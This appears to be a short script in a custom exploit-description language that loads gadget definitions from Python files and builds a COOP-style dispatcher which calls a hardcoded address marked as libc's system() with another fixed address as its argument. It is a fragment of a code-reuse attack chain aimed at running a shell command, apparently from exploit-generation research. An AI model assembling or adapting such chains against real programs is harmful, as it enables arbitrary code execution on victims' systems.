// Load gadget definitions from python scripts
IMPORT EXECUTE (int, int) RETURNS NONE FROM "execute.py";
IMPORT READ () RETURNS int FROM "read.py";
IMPORT MANIPULATE (reg) RETURNS NONE FROM "manipulate.py";
IMPORT DISPATCHER () RETURNS NONE FROM "mainloop.py";

// The object dispatcher (ML-G Gadget from COOP paper)
DISPATCHER {
    int system = 0x7ffff784e390;
    int target = 0x7ffff7995d57;
    EXECUTE(system, target);        // Call address 0x7ffff784e390 (&system), making sure that _r1 is still correct
}                                   // while calling
